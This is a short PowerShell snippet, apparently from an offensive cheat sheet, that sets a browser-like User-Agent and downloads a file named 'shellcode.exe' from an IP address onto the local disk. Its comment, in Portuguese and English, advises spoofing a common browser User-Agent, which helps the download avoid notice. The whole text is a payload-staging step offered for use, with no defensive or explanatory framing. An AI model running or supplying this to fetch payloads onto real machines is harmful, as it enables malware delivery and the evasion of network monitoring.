$webClient = New-Object Net.WebClient 
$webClient.Headers.Add('User-Agent', "Recomendo que coloque um user-agent de navegador comum | i recommend you to set a common web browser user-agent")
$webClient.DownloadFile('http://192.168.0.1/shellcode.exe', 'shellcode.exe')